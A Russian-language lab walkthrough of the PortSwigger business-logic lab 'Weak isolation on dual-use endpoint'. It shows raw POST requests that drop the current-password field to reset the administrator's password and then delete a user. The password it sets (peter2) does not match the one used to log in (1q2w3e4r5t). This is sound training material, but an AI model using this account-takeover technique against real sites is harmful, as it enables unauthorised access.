Авторизуемся под данным нам пользователем `wiener:peter`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/5.%20Business%20logic%20vulnerabilities/8.%20Weak%20isolation%20on%20dual-use%20endpoint/pics%20for%20walktrough/1.png)

И пройдем полную процедуру по смене пароля. Далее перейдем в `Proxy` -> `HTTP history`, и найдем непосредственно тот самый `POST` запрос и отправим его в `Repeater`, который отправляется при смене пароля
```
POST /my-account/change-password
...
csrf=Xqd5RKVFZCaTCZOBkBz43OLGU1H1oknE&username=wiener&current-password=peter&new-password-1=peter1&new-password-2=peter1
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/5.%20Business%20logic%20vulnerabilities/8.%20Weak%20isolation%20on%20dual-use%20endpoint/pics%20for%20walktrough/2.png)
Увидим, что в запросе имеется параметр `current-password=peter`. Попробуем его удалить, и посмотреть, что вернет веб-сервер в ответ
```
POST /my-account/change-password
...
csrf=Xqd5RKVFZCaTCZOBkBz43OLGU1H1oknE&username=wiener&new-password-1=peter2&new-password-2=peter2
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/5.%20Business%20logic%20vulnerabilities/8.%20Weak%20isolation%20on%20dual-use%20endpoint/pics%20for%20walktrough/3.png)
Отлично, веб-сервер запрос принял и обработал. Соответвенно, мы можем устанавливать свой пароль для любого пользователя вышеописанным способом. Установим свой пароль для `username=administrator`

```
POST /my-account/change-password
...
csrf=Xqd5RKVFZCaTCZOBkBz43OLGU1H1oknE&username=administrator&new-password-1=peter2&new-password-2=peter2
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/5.%20Business%20logic%20vulnerabilities/8.%20Weak%20isolation%20on%20dual-use%20endpoint/pics%20for%20walktrough/4.png)
Авторизуемся под `administrator:1q2w3e4r5t`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/5.%20Business%20logic%20vulnerabilities/8.%20Weak%20isolation%20on%20dual-use%20endpoint/pics%20for%20walktrough/5.png)
Зайдем в `Admin panel` и удалим пользователя `carlos`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/5.%20Business%20logic%20vulnerabilities/8.%20Weak%20isolation%20on%20dual-use%20endpoint/pics%20for%20walktrough/6.png)
На что получим `User deleted successfully!` и выполненную лабораторную работу

